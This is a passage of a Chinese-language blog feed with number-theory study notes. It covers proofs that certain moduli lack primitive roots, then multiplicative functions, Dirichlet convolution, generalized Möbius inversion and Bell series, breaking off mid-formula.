&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;$2^\alpha$没有原根&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;令$x$是一个奇数，对$\alpha\ge3$，我们有$x^{\dfrac{\varphi(2^\alpha)}{2}}\equiv1(\mod{2^\alpha})$，所以$2^\alpha$没有原根。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;用归纳法证明：&lt;/p&gt;
&lt;p&gt;首先，当$\alpha=3$，命题即是说$x^2\equiv1(\mod{8}),x=1,3,5,7$。所以没有原根。&lt;/p&gt;
&lt;p&gt;假设对$\alpha$成立，只要证明对$\alpha+1$成立，命题就成立。&lt;/p&gt;
&lt;p&gt;对$\alpha$成立的话，$x^{\dfrac{\varphi(2^\alpha)}{2}}=t2^\alpha+1$。&lt;/p&gt;
&lt;p&gt;平方得到$x^{\varphi(2^\alpha)}=1+t^22^{2\alpha}+t2^{\alpha+1} \equiv 1(\mod{2^{\alpha+1}})$&lt;/p&gt;
&lt;p&gt;又因为$\varphi(2^\alpha)=2^{\alpha-1}=\dfrac{\varphi(2^{\alpha+1})}{2}$&lt;/p&gt;
&lt;p&gt;所以$x^{\varphi(2^\alpha)} \equiv x^{\dfrac{\varphi(2^\alpha)}{2}}\equiv 1(\mod{2^{\alpha+1}})$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;其他情况下原根不存在：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;给定$m\ge1$，$m\not={1,2,4,p^\alpha,2p^\alpha}$，其中$p$是奇素数。对于任何一个与$m$互素的$a$，我们有$a^{\dfrac{\varphi(m)}{2}}\equiv1(\mod{m})$。于是m没有原根&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;因为当$\alpha\ge3$的时候，模$2^\alpha$没有原根，所以我们假设$m$分解为
$$
m=2^\alpha p_1^{\alpha_1}p_2^{\alpha_2} \cdots p_s^{\alpha_s} \newline
\varphi(m)=\varphi(2^\alpha)\varphi(p_1^{\alpha_1})\cdots\varphi(p_s^{\alpha_s})
$$
其中$p_i$是奇素数，$s\ge1,\alpha\ge0$。&lt;/p&gt;
&lt;p&gt;由于$m\not={1,2,4,p^\alpha,2p^\alpha}$，所以：&lt;/p&gt;
&lt;p&gt;当$s=1$，有$\alpha\ge2$；&lt;/p&gt;
&lt;p&gt;当$\alpha=0或1$，有$s\ge2$。&lt;/p&gt;
&lt;p&gt;我们希望$a^{\dfrac{\varphi(m)}{2}}\equiv1(\mod{m})$，令$g$是模$p_1^{\alpha_1}$的一个原根，选k使$a\equiv g^k(\mod{p_1^{\alpha_1}})$.&lt;/p&gt;
&lt;p&gt;于是$a^{\dfrac{\varphi(m)}{2}}\equiv g^{\dfrac{\varphi(m)k}{2}}\equiv g^{t\varphi(p_1^{\alpha_1})}(\mod{p_1^{\alpha_1}})$&lt;/p&gt;
&lt;p&gt;其中，$t=k\varphi(2^\alpha)\varphi(p_1^{\alpha_1})\cdots\varphi(p_s^{\alpha_s})\dfrac{1}{2}$&lt;/p&gt;
&lt;p&gt;如果$\alpha\ge2$，那么因子$\varphi(2^\alpha)$是偶数；&lt;/p&gt;
&lt;p&gt;如果$\alpha=0,1$则$s\ge2$，那么因子$\varphi(p_2^{\alpha_2})$也是偶数，（欧拉函数性质算出来变成$p_2^{\alpha_2}(p_2-1)$，后面括号里面的会提供一个2​）&lt;/p&gt;
&lt;p&gt;所以$t$是一个整数。 $a^{\dfrac{\varphi(m)}{2}} \equiv g^{t\varphi(p_1^{\alpha_1})}\equiv 1 (\mod{p_1^{\alpha_1}})$&lt;/p&gt;
&lt;p&gt;扩展成$a^{\dfrac{\varphi(m)}{2}} \equiv  1 (\mod{p_i^{\alpha_i}})$&lt;/p&gt;
&lt;p&gt;目前为止，我们还需要证明这个同余式对模$2^\alpha$也成立。&lt;/p&gt;
&lt;p&gt;根据模$2^\alpha$不存在原根的定理，我们有
$$
a^{\dfrac{\varphi(2^\alpha)}{2}}\equiv 1(\mod{2^\alpha}),(\alpha\ge3)
$$
而$\varphi(2^\alpha)|\varphi(m)$，所以$a^{\dfrac{\varphi(m)}{2}}\equiv 1(\mod{2^\alpha}),(\alpha\ge3)$&lt;/p&gt;
&lt;p&gt;接下来只剩下$\alpha\le2$的情况了，对于这种情况，根据定义我们有
$$
a^{\varphi(2^\alpha)}\equiv1(\mod{2^\alpha})
$$
我们想要将$\varphi(2^\alpha)$转换成$\dfrac{\varphi(m)}{2}$，就需要$\varphi(2^\alpha)|\dfrac{\varphi(m)}{2}$，实际上这是成立的，因为既然$m$中$s\ge1$，那么$\varphi(m)=\varphi(2^\alpha)\varphi(p_1^{\alpha_1})\cdots\varphi(p_s^{\alpha_s})$中就肯定能分出一个$2r\varphi(2^\alpha)$，其中$r$是整数。&lt;/p&gt;
&lt;p&gt;于是对所有的$\alpha$都成立：
$$
a^{\dfrac{\varphi(2^\alpha)}{2}}\equiv 1(\mod{2^\alpha}),(\alpha\ge3)
$$
最后我们乘在一起，得到
$$
a^{\dfrac{\varphi(m)}{2}}\equiv1(\mod{m})
$$
这证明，$a$不能是模$m$的原根。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>解析数论之数论函数【其二】</title>
        <link>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%BA%8C/</link>
        <pubDate>Mon, 24 Jul 2023 16:35:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%BA%8C/</guid>
        <description>


&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34; fill=&#34;hsl(30, 80%, 70%)&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;本文使用&lt;strong&gt;Typora&lt;/strong&gt;编写，但Hugo使用&lt;strong&gt;KaTex&lt;/strong&gt;渲染，可能会出现不兼容状态，如需最佳体验请前往&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/DorinXL/p/17572690.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这里&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;h2 id=&#34;目录&#34;&gt;目录
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Chapter1 积性函数与狄利克雷乘积&lt;/li&gt;
&lt;li&gt;Chapter2 广义卷积&lt;/li&gt;
&lt;li&gt;Chapter3 形式幂级数和数论函数的贝尔级数&lt;/li&gt;
&lt;li&gt;Chapter4 数论函数的导数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter1-积性函数与狄利克雷乘积&#34;&gt;Chapter1 积性函数与狄利克雷乘积
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有数论函数$f$,如果$f$不恒为零，且对任意的$(m,n)=1$有$f(mn)=f(m)f(n)$，那么这个数论函数$f$被称为是&lt;strong&gt;积性&lt;/strong&gt;的。&lt;/li&gt;
&lt;li&gt;如果对于任意的$m,n$都有$f(mn)=f(m)f(n)$，那么这个数论函数$f$被称为是&lt;strong&gt;完全积性&lt;/strong&gt;的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;令幂函数$f_\alpha(n) = n^\alpha$,这里的$\alpha$是固定的实数或复数。这个函数是完全积性函数。$u=f_0$是完全积性的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$$
\begin{align*}
f_\alpha(mn) &amp;amp;= (mn)^\alpha  \newline
&amp;amp;=(m^\alpha)(n^\alpha)  \newline
&amp;amp;=f_\alpha(m)f_\alpha(n)  \newline
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;恒等函数$I(n)=[\dfrac{1}{n}]$是完全积性的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$$
I(mn) = [\dfrac{1}{mn}]
=\begin{cases}1,&amp;amp;\text{if $m,n=1$}  \newline
0,&amp;amp;\text{if $m&amp;gt;1 || n&amp;gt;1$}\end{cases}
$$&lt;/p&gt;
&lt;p&gt;$$
I(m)I(n) = [\dfrac{1}{m}][\dfrac{1}{n}]
=\begin{cases}1,&amp;amp;\text{if $m,n=1$}  \newline
0,&amp;amp;\text{if $m&amp;gt;1 || n&amp;gt;1$}\end{cases}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;莫比乌斯函数$\mu()$是积性的但不是完全积性的.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;考虑两个互素的整数$m,n$。&lt;/p&gt;
&lt;p&gt;若$m,n$中任意一个的因子表示为$p^\alpha,\alpha\ge2$,那么有
$$
\mu(mn)=\mu(m)\mu(n) = 0
$$
若$m,n$中没有上述情况，那么可以将$m,n$表示为：
$$
m = p_1p_2 \cdots p_s  \newline
n = q_1q_2 \cdots q_t  \newline
\Downarrow  \newline
\mu(m) = (-1)^s  \newline
\mu(n) = (-1)^t  \newline
\mu(mn) = (-1)^{(s+t)} = \mu(m)\mu(n)
$$
这表明莫比乌斯函数$\mu$是积性函数。但其不是完全积性函数，因为：
$$
\mu(4)=0  \newline
\mu(2)\mu(2) = 1
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;欧拉函数$\varphi()$是积性函数但不是完全积性函数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;是积性函数：由欧拉函数的性质可以得到：
$$
\varphi(mn) = \varphi(m)\varphi(n)
$$
不是完全积性函数：
$$
\varphi(4) = 2 \newline
\varphi(2)\varphi(2) = 1
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果$f,g$是积性函数/完全积性函数，那么$fg,\dfrac{f}{g}$也是积性函数/完全积性函数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以$fg$为例：
$$
\begin{align*}
fg(mn) &amp;amp;= f(mn)g(mn)  \newline
&amp;amp;= f(m)f(n)g(m)g(n)  \newline
&amp;amp;= f(m)g(m)f(n)g(n)  \newline
&amp;amp;= fg(m)fg(n)
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Th1:如果$f$是积性的，那么$f(1)=1$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对任意n，有$(n,1)=1$，由积性函数的性质我们可以得到：$f$不恒为零，且有$f(n)=f(1)f(n)$，于是存在n，使$f(n)\neq0,f(1)=1$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th2:给定$f$，且$f(1)=1$，那么：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$f$是积性的 $\Longleftrightarrow$ $f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r}) =f(p_1^{\alpha_1})f(p_2^{\alpha_2})\cdots f(p_r^{\alpha_r})$&lt;/li&gt;
&lt;li&gt;如果$f$是积性的，那么：$f$是完全积性的 $\Longleftrightarrow$ $f(p^\alpha) = f(p)^\alpha$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Th2.1: 如果$f$是积性的，显然$p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r}$中的$p_1^{\alpha_1},p_2^{\alpha_2},\cdots ,p_r^{\alpha_ r}$这些数字都是互素的，那么根据积性函数的定义就有：
$$
f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r})
=f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_{r-1}^{\alpha_ {r-1}})f(p_r^{\alpha_r})
=f(p_1^{\alpha_1})f(p_2^{\alpha_2})\cdots f(p_r^{\alpha_r})
$$
反过来，我们有$f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r}) =f(p_1^{\alpha_1})f(p_2^{\alpha_2})\cdots f(p_r^{\alpha_r})$，想证明$f$是积性函数， 我们取$(m,n)=1,m=p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r},n=q_1^{\beta_1}q_2^{\beta_2}\cdots q_t^{\beta_ t}$.
$$
\begin{align*}
f(mn)&amp;amp;=f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r}q_1^{\beta_1}q_2^{\beta_2}\cdots q_t^{\beta_ t}) \newline
&amp;amp;=f(p_1^{\alpha_1})f(p_2^{\alpha_2})\cdots f(p_r^{\alpha_r})f(q_1^{\beta_1})f(q_2^{\beta_2})\cdots f(q_r^{\beta_r}) \newline
&amp;amp;=f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r})f(q_1^{\beta_1}q_2^{\beta_2}\cdots q_t^{\beta_ t}) \newline
&amp;amp;=f(m)f(n)
\end{align*}
$$
Th2.2:如果$f$是完全积性的，那么
$$
f(p^\alpha) = f(p^{\alpha-1})f(p) = f(p)^\alpha
$$
反过来，我们有$f$是积性函数，$f(p^\alpha) = f(p)^\alpha$,想证明$f$是完全积性函数，我们取整数$m,n\ge1,m=p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r},n=p_1^{\beta_1}p_2^{\beta_2}\cdots p_t^{\beta_ t}.\alpha和\beta可能为0$
$$
\begin{align*}
f(m)f(n)&amp;amp;=f(p_1^{\alpha_1}p_2^{\alpha_2}\cdots p_r^{\alpha_ r})f(p_1^{\beta_1}p_2^{\beta_2}\cdots p_t^{\beta_ t}) \newline
&amp;amp;=f(p_1^{\alpha_1})f(p_2^{\alpha_2})\cdots f(p_r^{\alpha_r})f(p_1^{\beta_1})f(p_2^{\beta_2})\cdots f(p_r^{\beta_r}) \newline
&amp;amp;=f(p_1)^{\alpha_1}f(p_2)^{\alpha_2}\cdots f(p_r)^{\alpha_r}f(p_1)^{\beta_1}f(p_2)^{\beta_2}\cdots f(p_r)^{\beta_r} \newline
&amp;amp;=f(p_1)^{\alpha_1+\beta_1}f(p_2)^{\alpha_2+\beta_2}\cdots f(p_r)^{\alpha_r+\beta_r} \newline
&amp;amp;=f(p_1^{\alpha_1+\beta_1})f(p_2^{\alpha_2+\beta_2})\cdots f(p_r^{\alpha_r+\beta_r}) \newline
&amp;amp;=f(mn)
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th3:如果$f$和$g$是积性的，那么他们的狄利克雷卷积也是积性的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:令$h=f&lt;em&gt;g$，选取互素的整数$m,n$，那么：
$$
h(mn) = \sum_{c|mn}f(c)g(\dfrac{mn}{c})
$$
$m,n$的每一个因子c都可以写成$c=ab$的形式，其中$a|m,b|n,(a,b)=1$
$$
\begin{align&lt;/em&gt;}
h(m)h(n)&amp;amp;=f(m)g(m)f(n)g(n)  \newline
&amp;amp;=\sum_{a|m}f(a)g(\dfrac{m}{a})\sum_{b|n}f(b)g(\dfrac{n}{b})  \newline
&amp;amp;=\sum_{a|m \newline b|n}f(a)f(b)g(\dfrac{m}{a})g(\dfrac{n}{b})  \newline
根据整除的推论： \newline
(m,n)=1,mn的因子可以唯一由 \newline
m的因子和n的因子的乘积表示
&amp;amp;=\sum_{ab|mn}f(ab)g(\dfrac{mn}{ab})  \newline
&amp;amp;=h(mn)
\end{align*}
$$
**Node:**两个完全积性函数的狄利克雷乘积不一定是完全积性的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th4：如果$g$和$f*g$都是积性的，那么$f$也是积性的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假设$f$不是积性的，那么我们如果推出$f*g$不是积性的，即可通过矛盾证明该结论。&lt;/p&gt;
&lt;p&gt;选择$(m,m)=1$使得$f(mn) \ne f(m)f(n)$，让$m,n$尽量的小。&lt;/p&gt;
&lt;p&gt;如果$mn=1$，那么$f(1) \ne f(1)f(1),f(1)\ne 1$。因为$h(1)=(f*g)(1)=f(1)g(1)=f(1)\ne 1$，所以h不是积性函数。&lt;/p&gt;
&lt;p&gt;如果$mn&amp;gt;1$，选择$(a,b)=1,ab&amp;lt;mn$，使得$f(ab)=f(a)f(b)$。
$$
\begin{align*}
(f&lt;em&gt;g)(mn)&amp;amp;=\sum\limits_{a|m \newline b|n \newline ab&amp;lt;mn}f(ab)g(\dfrac{mn}{ab})+f(mn)g(1) \newline
&amp;amp;=\sum_{a|m}f(a)g(\dfrac{m}{a})+\sum_{b|n}f(b)g(\dfrac{n}{b})-f(m)f(n)+f(mn) \newline
&amp;amp;=(f&lt;/em&gt;g)(m)(f&lt;em&gt;g)(n)-f(n)f(m)+f(mn)
\end{align&lt;/em&gt;}
$$
而$f(mn)\ne f(m)f(n)$，所以$h(mn)\ne h(m)h(n)$，$h$不是积性的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th5：如果$g$是积性的，那么它的狄利克雷逆$g^{-1}$也是积性的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们知道$g$是积性的，而$g*g^{-1}=I$也是积性的，那么根据Th4我们得出Th5。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th6：如果$f$是积性的，那么有：$f$是完全积性的 $\Longleftrightarrow$ $f^{-1}(n) = \mu(n)f(n)$,对所有的$n\ge1$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;证明$\Rightarrow$:想通过“$f$是完全积性的”这一条件证明“$f^{-1}(n) = \mu(n)f(n)$”,我们设$g(n)=\mu(n)f(n)$
$$
\begin{align*}
(g&lt;em&gt;f)(n)&amp;amp;=\sum_{d|n}\mu(d)f(d)f(\dfrac{n}{d}) \newline
&amp;amp;=\sum_{d|n}\mu(d)f(n) \newline
&amp;amp;=f(n)\sum_{d|n}\mu(d) \newline
&amp;amp;=f(n)I(n)  \newline
&amp;amp;=I(n)
\end{align&lt;/em&gt;}
$$
既然有$(g*f)=I$，那么有$f^{-1}(n) = \mu(n)f(n)$&lt;/p&gt;
&lt;p&gt;证明$\Leftarrow$：想通过“$f$是积性的，且$f^{-1}(n) = \mu(n)f(n)$”这一条件证明“$f$是完全积性的”,我们只需要证出对所有素数$p$有$f(p^\alpha)=f(p)^\alpha$即可。
$$
\begin{align*}
我们有(f&lt;em&gt;f^{-1}&amp;amp;=I) \newline
那么 \newline
\sum_{d|n}f^{-1}(d)f(\dfrac{n}{d})&amp;amp;=0 \quad (n&amp;gt;1) \newline
\sum_{d|n}\mu(d)f(d)f(\dfrac{n}{d})&amp;amp;=0 \newline
取n=p^\alpha,有 \newline
\mu(1)f(1)f(p^\alpha)+\mu(p)f(p)f(p^{\alpha-1})+0&amp;amp;=0 \newline
f(p^\alpha)+(-1)f(p)f(p^{\alpha-1})&amp;amp;=0 \newline
f(p^\alpha)&amp;amp;=f(p)f(p^{\alpha-1})
\end{align&lt;/em&gt;}
$$
从$\alpha\ge2$开始递推，$f(p^2)=f(p)f(p),f(p^3)=f(p)f(p^2)=f(p)^3$，所以我们证明出对所有素数$p$有$f(p^\alpha)=f(p)^\alpha$，即$f$是完全积性的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th7：如果$f$是积性的，那么有：$\sum\limits_{d|n}\mu(d)f(d)=\prod\limits_{p|n}(1-f(p))$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;令$g(n)=\sum\limits_{d|n}\mu(d)f(d)$，$g$是积性的，利用算术基本定理，我们只需要计算$g(p^\alpha)$即可。
$$
\begin{align*}
g(p^\alpha)&amp;amp;=\sum_{d|p^\alpha}\mu(d)f(d) \newline
&amp;amp;=\mu(1)f(1)+\mu(p)f(p)+0+\cdots+0 \newline
&amp;amp;=f(1)-f(p) \newline
&amp;amp;=1-f(p)
\end{align*}
$$
所以对于由若干素数幂乘积组成的$n$，我们有
$$
g(n)=g(p_1^{\alpha1}p_2^{\alpha2}\cdots p_r^{\alpha r})=(1-f(p_1))(1-f(p_2))\cdots(1-f(p_r))=\prod_{p|n}(1-f(p))
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter2-广义卷积&#34;&gt;Chapter2 广义卷积
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：$F$表示一个定义在正实轴$(0,\infty)$上的实数函数，对$0&amp;lt;x&amp;lt;1$,有$F(x)=0$。我们定义出一个新函数$G$,表示为
$$
G = \sum_{n\le{x}}\alpha(n)F(\dfrac{x}{n})
$$
其中，$\alpha$是任意数论函数。对于$0&amp;lt;x&amp;lt;1$,也有$G(x)=0$。$\alpha,F,G$的关系可以表示为：
$$
(\alpha\circ F)(x) = \sum_{n\le{x}}\alpha(x)F(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：关于$\circ$和$*$的结合性，单独的运算$\circ$是可交换但是不可以结合的，配合狄利克雷乘积和任意数论函数$\alpha$和$\beta$我们有
$$
\alpha \circ (\beta \circ F) = (\alpha * \beta)\circ F
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;对于$x&amp;gt;0$有：
$$
\begin{align*}
{\alpha \circ (\beta \circ F)}(x)&amp;amp;=\sum_{n\le x}\alpha(n)\sum_{m\le\dfrac{x}{n}}\beta(m)F(\dfrac{x}{mn}) \newline
&amp;amp;=\sum_{mn\le x}\alpha(n)\beta(m)F(\dfrac{x}{mn}) \newline
&amp;amp;=\sum_{k\le x}(\sum_{n|k}\alpha(n)\beta(\dfrac{k}{n}))F(\dfrac{x}{k}) \newline
&amp;amp;=\sum_{k\le x}(\alpha*\beta)(k)F(\dfrac{x}{k}) \newline
&amp;amp;={(\alpha*\beta)\circ F}(x)
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：（广义反转公式）如果$\alpha$有一个狄利克雷逆函数$\alpha^{-1}$，那么有：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
G(x) = \sum_{n\le{x}}\alpha(n)F(\dfrac{x}{n}) \newline
\Updownarrow  \newline&lt;br&gt;
F(x) = \sum_{n\le{x}}\alpha^{-1}(n)G(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;已知$G= \sum_{n\le{x}}\alpha(n)F(\dfrac{x}{n})=\alpha \circ F  \newline $，
$$
\alpha^{-1}\circ G=\alpha^{-1}\circ(\alpha \circ F)=(\alpha^{-1}&lt;em&gt;\alpha)\circ F=I\circ F=F \newline
F=\alpha^{-1}\circ G= \sum_{n\le{x}}\alpha^{-1}(n)G(\dfrac{x}{n})
$$
已知$F= \sum_{n\le{x}}\alpha^{-1}(n)G(\dfrac{x}{n})=\alpha^{-1}\circ G$，
$$
\alpha \circ F=\alpha \circ(\alpha^{-1}\circ G)=(\alpha^{-1}&lt;/em&gt;\alpha)\circ G=I \circ G = G \newline
G = \alpha \circ F = \sum_{n\le{x}}\alpha(n)F(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th3：（广义莫比乌斯反转）如果$\alpha$是完全积性的，那么有：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
G(x) = \sum_{n\le{x}}\alpha(n)F(\dfrac{x}{n}) \newline
\Updownarrow  \newline&lt;br&gt;
F(x) = \sum_{n\le{x}}\mu(n)\alpha(n)G(\dfrac{x}{n})
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;令$\alpha^{-1}=\alpha\mu$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter3-形式幂级数和数论函数的贝尔级数&#34;&gt;Chapter3 形式幂级数和数论函数的贝尔级数
&lt;/h2&gt;&lt;h3 id=&#34;section1-形式幂级数&#34;&gt;Section1 形式幂级数
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;我们知道，在微积分中，x的幂级数形如：
$$
\sum_{n=0}^{\infty}a(n)x^n = a(0)+a(1)x+a(2)x^2+a(3)x^3+\cdots+a(n)x^n+\cdots
$$
这样一个幂级数拥有收敛半径，在范围内会收敛或是发散。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;而从另一个角度来说，我们使用幂级数的写作形式，但不关心x的值，不关心收敛或发散的问题，而是关心幂级数的系数序列$(a(0),a(1),a(2),\cdots,a(n),\cdots)$。这些系数序列可以由幂级数中$x^n$的$n$来定位。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;形式幂级数就是通过这样一种角度来理解幂级数，把幂级数看作收敛的并在其上规定代数运算。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;现在我们有两个形式幂级数，分别是$A(x)$和$B(x)$：
$$
A(x) = \sum_{n=0}^{\infty}a(n)x^n  \newline B(x)=\sum_{n=0}^{\infty}b(n)x^n
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th1：规定相等$A(x) = B(x)$，即$a(n)=b(n),n\ge0$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th2：规定和$A(x)+B(x)=\sum\limits_{n=0}^{\infty}(a(n)+b(n))x^n$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Th3：规定乘积$A(x)B(x)=\sum\limits_{n=0}^{\infty}c(n)x^n$，其中$c(n) = \sum\limits_{k=0}^{\infty}a(k)b(n-k)$。序列${c(n)}$被称为序列${a(n)}$和${b(n)}$的柯西乘积。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section2-贝尔级数&#34;&gt;Section2 贝尔级数
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：给定一个数论函数$f$和一个素数$p$，我们规定形式幂级数
$$
f_p(x)=\sum\limits_{n=0}^{\infty}f(p^n)x^n
$$
是$f$关于模$p$的贝尔级数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;莫比乌斯函数$\mu()$的贝尔级数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由莫比乌斯函数的定义我们可知：$\mu(p)=-1$，对所有的$n\ge2,\mu(p^n)=0$。
$$
\begin{align*}
